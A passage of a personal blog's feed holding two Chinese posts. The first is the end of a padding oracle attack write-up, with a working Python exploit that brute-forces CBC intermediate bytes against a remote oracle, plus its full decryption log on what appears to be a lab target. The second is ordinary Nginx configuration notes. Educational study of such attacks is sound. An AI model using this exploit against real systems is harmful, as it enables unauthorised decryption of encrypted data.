class="line">    lst.append(<span class="number">0</span>)</span><br><span class="line">    r.send(bytes(lst))</span><br><span class="line">    <span class="keyword">return</span> r.recv(numb=<span class="number">2</span>).decode()[<span class="number">0</span>] == <span class="string">'1'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从最后一块开始破译 c[-x]</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,len(c)):</span><br><span class="line">    print(<span class="string">"Detecting Block &#123;&#125;"</span>.format(x))</span><br><span class="line">    block = c[-x] <span class="comment"># 当前分组</span></span><br><span class="line">    prior_block = [int(i) <span class="keyword">for</span> i <span class="keyword">in</span> bytes.fromhex(c[-x<span class="number">-1</span>])] <span class="comment"># 前一分组</span></span><br><span class="line">    </span><br><span class="line">    iv = [<span class="number">0</span>]*<span class="number">16</span> <span class="comment"># 初始向量</span></span><br><span class="line">    Ivalue = [] <span class="comment"># 中间值</span></span><br><span class="line">    m = [] <span class="comment"># 明文(hex)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 一个分组16B</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">17</span>):</span><br><span class="line">        print(<span class="string">" round &#123;&#125;"</span>.format(i))</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 修正</span></span><br><span class="line">        l = len(Ivalue)</span><br><span class="line">        iv = iv[:<span class="number">16</span>-l] + [x^i <span class="keyword">for</span> x <span class="keyword">in</span> Ivalue[::<span class="number">-1</span>]]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 爆破vi[-i]</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,pow(<span class="number">2</span>,<span class="number">8</span>)):</span><br><span class="line">            iv[-i] = j</span><br><span class="line">            build = <span class="string">''</span>.join([str(hex(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> iv]) + block</span><br><span class="line">            <span class="keyword">if</span> send_payload(build):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 更新</span></span><br><span class="line">        Ivalue.append(iv[-i]^i)</span><br><span class="line">        m.append(Ivalue[<span class="number">-1</span>]^prior_block[-i])</span><br><span class="line">        print(<span class="string">" - IV     : &#123;&#125;"</span>.format(<span class="string">''</span>.join([str(hex(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> iv])))</span><br><span class="line">        print(<span class="string">" - Ivalue : &#123;&#125;"</span>.format(<span class="string">''</span>.join([str(hex(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> Ivalue[::<span class="number">-1</span>]])))</span><br><span class="line">        print(<span class="string">" - m      : &#123;&#125;"</span>.format(<span class="string">''</span>.join([str(hex(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> m[::<span class="number">-1</span>]])))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># print the message</span></span><br><span class="line">    print(<span class="string">''</span>.join(chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> m[::<span class="number">-1</span>]))</span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Detecting</span> <span class="string">Block</span> <span class="number">1</span></span><br><span class="line"> <span class="string">round</span> <span class="number">1</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">IV     :</span> <span class="string">000000000000000000000000000000ca</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">cb</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">0b</span></span><br><span class="line"> <span class="string">round</span> <span class="number">2</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">IV     :</span> <span class="string">000000000000000000000000000084c9</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">86cb</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">0b0b</span></span><br><span class="line"> <span class="string">round</span> <span class="number">3</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">IV     :</span> <span class="string">000000000000000000000000004585c8</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">4686cb</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">0b0b0b</span></span><br><span class="line"> <span class="string">round</span> <span class="number">4</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">IV     :</span> <span class="string">000000000000000000000000ac4282cf</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">a84686cb</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">0b0b0b0b</span></span><br><span class="line"> <span class="string">round</span> <span class="number">5</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">IV     :</span> <span class="string">000000000000000000000094ad4383ce</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">91a84686cb</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">0b0b0b0b0b</span></span><br><span class="line"> <span class="string">round</span> <span class="number">6</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">IV     :</span> <span class="string">00000000000000000000ab97ae4080cd</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">ad91a84686cb</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">0b0b0b0b0b0b</span></span><br><span class="line"> <span class="string">round</span> <span class="number">7</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">IV     :</span> <span class="string">00000000000000000070aa96af4181cc</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">77ad91a84686cb</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">0b0b0b0b0b0b0b</span></span><br><span class="line"> <span class="string">round</span> <span class="number">8</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">IV     :</span> <span class="string">0000000000000000797fa599a04e8ec3</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">7177ad91a84686cb</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">0b0b0b0b0b0b0b0b</span></span><br><span class="line"> <span class="string">round</span> <span class="number">9</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">IV     :</span> <span class="string">0000000000000036787ea498a14f8fc2</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">3f7177ad91a84686cb</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">0b0b0b0b0b0b0b0b0b</span></span><br><span class="line"> <span class="string">round</span> <span class="number">10</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">IV     :</span> <span class="string">000000000000c9357b7da79ba24c8cc1</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">c33f7177ad91a84686cb</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">0b0b0b0b0b0b0b0b0b0b</span></span><br><span class="line"> <span class="string">round</span> <span class="number">11</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">IV     :</span> <span class="string">0000000000a5c8347a7ca69aa34d8dc0</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">aec33f7177ad91a84686cb</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">0b0b0b0b0b0b0b0b0b0b0b</span></span><br><span class="line"> <span class="string">round</span> <span class="number">12</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">IV     :</span> <span class="string">0000000061a2cf337d7ba19da44a8ac7</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">6daec33f7177ad91a84686cb</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">290b0b0b0b0b0b0b0b0b0b0b</span></span><br><span class="line"> <span class="string">round</span> <span class="number">13</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">IV     :</span> <span class="string">000000e960a3ce327c7aa09ca54b8bc6</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">e46daec33f7177ad91a84686cb</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">3d290b0b0b0b0b0b0b0b0b0b0b</span></span><br><span class="line"> <span class="string">round</span> <span class="number">14</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">IV     :</span> <span class="string">0000e7ea63a0cd317f79a39fa64888c5</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">e9e46daec33f7177ad91a84686cb</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">203d290b0b0b0b0b0b0b0b0b0b0b</span></span><br><span class="line"> <span class="string">round</span> <span class="number">15</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">IV     :</span> <span class="string">001fe6eb62a1cc307e78a29ea74989c4</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">10e9e46daec33f7177ad91a84686cb</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">2e203d290b0b0b0b0b0b0b0b0b0b0b</span></span><br><span class="line"> <span class="string">round</span> <span class="number">16</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">IV     :</span> <span class="string">d000f9f47dbed32f6167bd81b85696db</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">c010e9e46daec33f7177ad91a84686cb</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">412e203d290b0b0b0b0b0b0b0b0b0b0b</span></span><br><span class="line"><span class="string">A.</span> <span class="string">=)\x0b\x0b\x0b\x0b\x0b\x0b</span></span><br><span class="line"><span class="string">Detecting</span> <span class="string">Block</span> <span class="number">2</span></span><br><span class="line"> <span class="string">round</span> <span class="number">1</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">IV     :</span> <span class="number">00000000000000000000000000000017</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="number">16</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="number">20</span></span><br><span class="line"> <span class="string">round</span> <span class="number">2</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">IV     :</span> <span class="string">0000000000000000000000000000f414</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">f616</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="number">6e20</span></span><br><span class="line"> <span class="string">round</span> <span class="number">3</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">IV     :</span> <span class="string">000000000000000000000000000ff515</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">0cf616</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="number">616e20</span></span><br><span class="line"> <span class="string">round</span> <span class="number">4</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">IV     :</span> <span class="string">0000000000000000000000008b08f212</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">8f0cf616</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="number">20616e20</span></span><br><span class="line"> <span class="string">round</span> <span class="number">5</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">IV     :</span> <span class="string">0000000000000000000000ef8a09f313</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">ea8f0cf616</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="number">7420616e20</span></span><br><span class="line"> <span class="string">round</span> <span class="number">6</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">IV     :</span> <span class="string">0000000000000000000078ec890af010</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">7eea8f0cf616</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="number">657420616e20</span></span><br><span class="line"> <span class="string">round</span> <span class="number">7</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">IV     :</span> <span class="string">0000000000000000002279ed880bf111</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">257eea8f0cf616</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="number">67657420616e20</span></span><br><span class="line"> <span class="string">round</span> <span class="number">8</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">IV     :</span> <span class="string">00000000000000009a2d76e28704fe1e</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">92257eea8f0cf616</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="number">2067657420616e20</span></span><br><span class="line"> <span class="string">round</span> <span class="number">9</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">IV     :</span> <span class="string">000000000000004e9b2c77e38605ff1f</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">4792257eea8f0cf616</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="number">752067657420616e20</span></span><br><span class="line"> <span class="string">round</span> <span class="number">10</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">IV     :</span> <span class="string">000000000000cd4d982f74e08506fc1c</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">c74792257eea8f0cf616</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">6f752067657420616e20</span></span><br><span class="line"> <span class="string">round</span> <span class="number">11</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">IV     :</span> <span class="string">000000000013cc4c992e75e18407fd1d</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">18c74792257eea8f0cf616</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">596f752067657420616e20</span></span><br><span class="line"> <span class="string">round</span> <span class="number">12</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">IV     :</span> <span class="string">000000006414cb4b9e2972e68300fa1a</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">6818c74792257eea8f0cf616</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">20596f752067657420616e20</span></span><br><span class="line"> <span class="string">round</span> <span class="number">13</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">IV     :</span> <span class="string">000000b86515ca4a9f2873e78201fb1b</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">b56818c74792257eea8f0cf616</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">2120596f752067657420616e20</span></span><br><span class="line"> <span class="string">round</span> <span class="number">14</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">IV     :</span> <span class="string">000064bb6616c9499c2b70e48102f818</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">6ab56818c74792257eea8f0cf616</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">792120596f752067657420616e20</span></span><br><span class="line"> <span class="string">round</span> <span class="number">15</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">IV     :</span> <span class="string">006565ba6717c8489d2a71e58003f919</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">6a6ab56818c74792257eea8f0cf616</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">61792120596f752067657420616e20</span></span><br><span class="line"> <span class="string">round</span> <span class="number">16</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">IV     :</span> <span class="string">d67a7aa57808d75782356efa9f1ce606</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">c66a6ab56818c74792257eea8f0cf616</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">5961792120596f752067657420616e20</span></span><br><span class="line"><span class="string">Yay!</span> <span class="string">You</span> <span class="string">get</span> <span class="string">an</span></span><br></pre></td></tr></table></figure><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Yay<span class="comment">! You get an A. =)</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;padding-oracle-attack&quot;&gt;&lt;a href=&quot;#padding-oracle-attack&quot; class=&quot;headerlink&quot; title=&quot;padding oracle attack&quot;&gt;&lt;/a&gt;padding oracle attack&lt;/
      
    
    </summary>
    
    
      <category term="密码学" scheme="https://mercer5.github.io/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="密码学" scheme="https://mercer5.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
      <category term="算法" scheme="https://mercer5.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="安全" scheme="https://mercer5.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Nginx笔记</title>
    <link href="https://mercer5.github.io/2021/10/31/Nginx%E7%AC%94%E8%AE%B0/"/>
    <id>https://mercer5.github.io/2021/10/31/Nginx%E7%AC%94%E8%AE%B0/</id>
    <published>2021-10-31T04:46:03.000Z</published>
    <updated>2021-10-31T11:16:30.600Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Nginx笔记"><a href="#Nginx笔记" class="headerlink" title="Nginx笔记"></a>Nginx笔记</h1><blockquote><p><a href="https://www.runoob.com/note/34639" target="_blank" rel="noopener">Nginx 配置文件解析</a></p></blockquote><h2 id="找到配置文件"><a href="#找到配置文件" class="headerlink" title="找到配置文件"></a>找到配置文件</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">locate</span> <span class="selector-tag">nginx</span><span class="selector-class">.conf</span></span><br></pre></td></tr></table></figure><p>一般在<code>/etc/nginx/nginx.conf</code></p><h2 id="重要的配置指令"><a href="#重要的配置指令" class="headerlink" title="重要的配置指令"></a>重要的配置指令</h2><ul><li><p>user: worker进程的用户和组</p></li><li><p>error_log: 错误写入文件</p></li><li><p>pid: 记录主进程ID的文件</p></li></ul><h2 id="include文件"><a href="#include文件" class="headerlink" title="include文件"></a>include文件</h2><p>增强配置文件的可读性(就是用来引入其他配置文件的?)</p><h2 id="location部分"><a href="#location部分" class="headerlink" title="location部分"></a>location部分</h2><h3 id="root"><a href="#root" class="headerlink" title="root"></a>root</h3><blockquote><p>也可以设置在server部分</p></blockquote><p>设置网站的根目录,eg</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root <span class="regexp">/var/</span>www<span class="regexp">/html/</span></span><br></pre></td></tr></table></figure><p>假如域名是</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">example</span><span class="selector-class">.com</span></span><br></pre></td></tr></table></figure><p>那么访问<code>example.com/folder/pic.jpg</code>即使访问<code>/var/www/html/folder/pic.jpg</code></p><h3 id="index"><a href="#index" class="headerlink" title="index"></a>index</h3><blockquote><p>也可以设置在server部分</p></blockquote><p>设置主页名字,一般为</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">index</span>, <span class="keyword">index</span>.html, <span class="keyword">index</span>.htm, <span class="keyword">index</span>.php</span><br></pre></td></tr></table></figure><p>作用: 访问<code>example.com/folder/</code>时,自动依次检索folder目录下的这些文件,一旦找到就返回给用户</p><h2 id="server部分"><a href="#server部分" class="headerlink" title="server部分"></a>server部分</h2><p>虚拟服务器部分</p><h3 id="listen"><a href="#listen" class="headerlink" title="listen"></a>listen</h3><p>用于指定监听端口,也就是对外开放的端口</p><p>定义了一个IP地址/端口组合或是UNIX域套接字路径</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">listen<span class="built_in"> address </span>[:port]</span><br><span class="line">listen port</span><br><span class="line">listen unix:path</span><br></pre></td></tr></table></figure><h3 id="server-name"><a href="#server-name" class="headerlink" title="server_name"></a>server_name</h3><p>指明虚拟主机的名字,用于选择不同的虚拟主机</p><p>默认值为: “”,对于没有设置Host头字段的请求,会匹配到该server处理</p><p>这个字段的设置也可以是IP地址,用于IP直接访问时</p><h3 id="location"><a href="#location" class="headerlink" title="location"></a>location</h3><p><code>location</code> 有多种功能, 重定向或提供来自客户端的url。 </p><p>它可以有多个，用来匹配用户请求的地址中 <code>server_name</code> 后面的部分。</p><ol><li><p>反向代理就会用到这个，例如在反代 deluge-web 时：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> /deluge/</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attribute">proxy_pass</span> http://localhost:8112/;</span><br><span class="line">  <span class="attribute">proxy_set_header</span> X-Deluge-Base <span class="string">"/deluge/"</span>;</span><br><span class="line">  <span class="attribute">add_header</span> X-Frame-Options SAMEORIGIN;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们先看这段配置的第一行： <code>location /deluge/</code> 。这表示它会匹配对 example.com/deluge/ 以及子目录的所有请求。</p><p>里面的第一句 <code>proxy_pass http://localhost:8112/;</code> 是反代的核心。它表示，把匹配到的所有请求都转发到 <code>http://localhost:8112/</code> 上，从而使外界访问 example.com/deluge 的时候能看到在服务器上访问 <code>http://localhost:8112/</code> 所看到的页面。</p><p>而后面的两句就和 HTTP 请求头有关系了。前面讲到 HTTP 请求头会包含用户请求的域名，事实上它除此之外还有用户的 IP、请求方法、Cookie、加密算法等信息。直接的 <code>proxy_pass</code> 会使后端服务器接收到的请求头与用户实际发出的请求头不同，所以可能需要加上一些额外的语句。</p></li><li><p><code>location</code> 里面也可以不是 <code>proxy_pass</code> ，它还可以是 <code>root</code> 、 <code>index</code> 来使用不同的根目录</p></li><li><p><code>location</code> 的第一行匹配还有别的方式，例如 <code>location = /a/</code> 。</p><p>location匹配结尾是否加斜杠“/”与其中的 <code>root</code> 或 <code>proxy_pass</code> 结尾是否加反斜杠之间有一定关系，不同组合有不同效果。</p></li></ol><h2 id="http部分"><a href="#http部分" class="headerlink" title="http部分"></a>http部分</h2><h3 id="access-log"><a href="#access-log" class="headerlink" title="access_log"></a>access_log</h3><blockquote><p>能够出现在 <code>http</code> 、 <code>server</code> 、 <code>location</code> 中。</p><p>可以在 <code>server</code> 中打开，而在某些特定的 <code>location</code> 中关闭。</p></blockquote><p>用于记录访问日志。一般写法：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">access_log /<span class="built_in">var</span>/<span class="keyword">log</span>/thelogfile.<span class="keyword">log</span>;</span><br></pre></td></tr></table></figure><p>或者关闭之：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">access_log</span> <span class="literal">off</span>;</span><br></pre></td></tr></table></figure><h2 id="错误日志文件格式"><a href="#错误日志文件格式" class="headerlink" title="错误日志文件格式"></a>错误日志文件格式</h2><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">&lt;timestamp&gt;</span> [log-level] <span class="params">&lt;master/worker pid&gt;</span><span class="meta">#0: message</span></span><br></pre></td></tr></table></figure><p>error级别的message包括</p><ul><li>连接数</li><li>系统调用</li><li>系统调用参数</li><li>从系统调用产生的错误消息</li><li>造成错误请求的客户端</li><li>负责处理请求的server</li><li>请求本身</li><li>在请求中发送的host头</li></ul><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p><a href="https://zhuanlan.zhihu.com/p/54793789" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/54793789</a></p><h3 id="静态HTTP服务器"><a href="#静态HTTP服务器" class="headerlink" title="静态HTTP服务器"></a>静态HTTP服务器</h3><p>首先，Nginx是一个HTTP服务器，可以将服务器上的静态文件（如HTML、图片）通过HTTP协议展现给客户端。</p><p>配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">listen80; # 端口号</span><br><span class="line">location &#x2F; &#123;</span><br><span class="line">root &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html; # 静态文件路径</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="反向代理服务器"><a href="#反向代理服务器" class="headerlink" title="反向代理服务器"></a>反向代理服务器</h3><p>客户端本来可以直接通过HTTP协议访问某网站应用服务器，网站管理员可以在中间加上一个Nginx，客户端请求Nginx，Nginx请求应用服务器，然后将结果返回给客户端，此时Nginx就是反向代理服务器。</p><p>配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">listen80;</span><br><span class="line">location &#x2F; &#123;</span><br><span class="line">proxy_pass http:&#x2F;&#x2F;192.168.20.1:8080; # 应用服务器HTTP地址</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>既然服务器可以直接HTTP访问，为什么要在中间加上一个反向代理，不是多此一举吗？反向代理有什么作用？继续往下看，下面的负载均衡、虚拟主机等，都基于反向代理实现，当然反向代理的功能也不仅仅是这些。</p><h3 id="负载均衡"><a href="#负载均衡" class="headerlink" 